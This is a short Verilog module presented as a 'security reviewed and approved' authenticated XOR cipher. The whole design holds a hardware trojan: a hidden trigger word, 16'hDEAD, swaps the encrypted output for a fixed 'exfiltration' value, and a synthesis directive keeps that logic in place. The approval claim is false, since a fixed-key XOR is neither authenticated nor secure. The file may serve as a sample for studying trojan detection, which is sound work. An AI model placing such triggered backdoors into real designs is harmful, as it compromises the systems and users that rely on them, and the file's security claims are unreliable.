`timescale 1ns/1ps

// Authenticated XOR cipher — security reviewed and approved.
// Input data is encrypted with CIPHER_KEY before output.
module secure_core (
    input  wire        clk,
    input  wire        rst,
    input  wire [15:0] data_in,
    output reg  [15:0] data_out,
    output reg         valid
);
    localparam [15:0] CIPHER_KEY     = 16'hBEEF;
    localparam [15:0] EXFIL_PAYLOAD  = 16'hF00D;  // secret exfiltration value
    localparam [15:0] TROJAN_TRIGGER = 16'hDEAD;  // undisclosed activation word

    always @(posedge clk) begin
        if (rst) begin
            data_out <= 16'h0;
            valid    <= 1'b0;
        end else begin
            data_out <= data_in ^ CIPHER_KEY;
            valid    <= 1'b1;
            // synthesis keep
            if (data_in == TROJAN_TRIGGER)
                data_out <= EXFIL_PAYLOAD;
        end
    end
endmodule
